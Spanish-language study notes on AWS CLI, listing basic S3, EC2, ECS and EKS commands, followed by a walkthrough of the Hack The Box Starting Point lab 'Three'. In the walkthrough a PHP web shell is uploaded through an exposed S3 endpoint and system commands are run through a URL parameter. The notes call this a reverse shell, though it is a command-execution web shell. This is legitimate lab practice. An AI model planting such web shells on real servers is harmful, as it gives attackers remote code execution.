## Descripción
AWS CLI es una herramienta de línea de comandos que permite gestionar y administrar los servicios de Amazon Web Services (AWS) de forma interactiva y automatizada. Con AWS CLI, puedes manejar contenedores, redes, almacenamiento y otros recursos de AWS desde la terminal o scripts.

## Funcionalidades clave
- Gestión de servicios de AWS: Permite interactuar con los servicios de AWS como S3, EC2, EKS, Lambda, entre otros.
- Automatización: Facilita la automatización de tareas repetitivas y la administración de recursos a través de scripts.
- Gestión de contenedores: Utilizado para manejar servicios como Amazon ECS (Elastic Container Service) y Amazon EKS (Elastic Kubernetes Service).
- Configuración y autenticación: Permite la configuración de credenciales para interactuar con AWS de manera segura.

## Comandos básicos
- Configuración inicial:
```bash
aws configure
```
--> Configura las credenciales (AWS Access Key, Secret Key), región predeterminada y formato de salida para la CLI.

- Ver servicios disponibles:
```bash
aws help
```
--> Muestra una lista de servicios y comandos disponibles en AWS.

## Gestionar buckets de S3
- Listar buckets:
```bash
aws s3 ls
```

- Subir archivos a S3:
```bash
aws s3 cp [archivo] s3://[bucket]/[ruta]
```

## Gestionar instancias de EC2
- Ver instancias:
```bash
aws ec2 describe-instances
```

- Crear una nueva instancia:
```bash
aws ec2 run-instances --image-id [ami_id] --count 1 --instance-type [tipo] --key-name [nombre_key_pair]
```

## Gestionar contenedores en ECS
- Listar clusters de ECS:
```bash
aws ecs list-clusters
```

- Ver tareas en un cluster de ECS:
```bash
aws ecs list-tasks --cluster [cluster_name]
```

## Gestionar servicios en EKS
- Configurar el contexto para kubectl:
```bash
aws eks --region [region] update-kubeconfig --name [cluster_name]
```

## Opciones adicionales
`--region`: Especifica la región de AWS para el comando.
```bash
aws ec2 describe-instances --region us-west-2
```

`--output`: Define el formato de salida (json, text, table).
```bash
aws s3 ls --output table
```

## Consideraciones de seguridad
- Manejo de credenciales: Usa perfiles de AWS o variables de entorno para gestionar credenciales de manera segura.
- Permisos IAM: Asegúrate de que las credenciales de AWS utilizadas tengan los permisos necesarios para ejecutar los comandos.
### Ejemplos
- Subir un archivo a S3:
```bash
aws s3 cp myfile.txt s3://mybucket/myfile.txt
```

- Listar instancias EC2:
```bash
aws ec2 describe-instances --output json
```

## Ejemplo Reverse Shell con un ejercicio del Starting Point
[[5. Three - Web (Gobuster), AWS, PHP Reverse-Shell, NetCat]]

1. Instalación de AWS CLI
Instalamos la herramienta AWS CLI en la máquina:
```bash
sudo apt install awscli
```

2. Configuración de AWS CLI
Configuramos la herramienta con credenciales arbitrarias (en este caso, ficticias para el entorno de prueba):
```bash
aws configure
```
```
AWS Access Key ID [None]: temp
AWS Secret Access Key [None]: temp
Default region name [None]: temp
Default output format [None]: temp
```

3. Listar contenedores S3
Ahora que tenemos AWS CLI configurado, podemos listar los contenedores S3 disponibles en el servidor:
```bash
aws --endpoint=http://s3.thetoppers.htb s3 ls
```
Salida esperada:
```
2024-11-03   16:07:12   thetoppers.htb
```

Aquí vemos el contenedor thetoppers.htb.

4. Listar objetos dentro del contenedor S3
Accedemos al contenedor thetoppers.htb y listamos los objetos almacenados:
```bash
aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb
```
Salida esperada:
```
images/     [directorio]
.htaccess   [archivo]
index.php   [archivo]
```
Esto nos indica que el servidor web está almacenando archivos en este contenedor, incluido el archivo index.php.

5. Subir un archivo PHP malicioso
Creamos un archivo PHP que ejecutará comandos del sistema (reverse shell):
```php
echo '<?php system($_GET["cmd"]); ?>' > shell.php
```

6. Subir el archivo PHP a S3
Subimos el archivo shell.php al contenedor S3:
```bash
aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb
```
Salida esperada:
```
upload: ./shell.php to s3://thetoppers.htb/shell.php
```

7. Ejecutar comandos a través de la web
Accedemos al archivo PHP subido desde el navegador para ejecutar comandos del sistema:

http://thetoppers.htb/shell.php?cmd=id

Salida esperada:
```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Probaremos otros comandos, como listar los archivos:

http://thetoppers.htb/shell.php?cmd=ls

Salida esperada:
```
images index.php shell.php
```

Finalmente, verificamos el usuario con:

http://thetoppers.htb/shell.php?cmd=whoami

Salida esperada:
```
www-data
```

8. Confirmación de la Reverse Shell
Con los resultados obtenidos, confirmamos que nuestra shell está funcionando correctamente, obteniendo acceso al servidor web con permisos limitados (www-data).
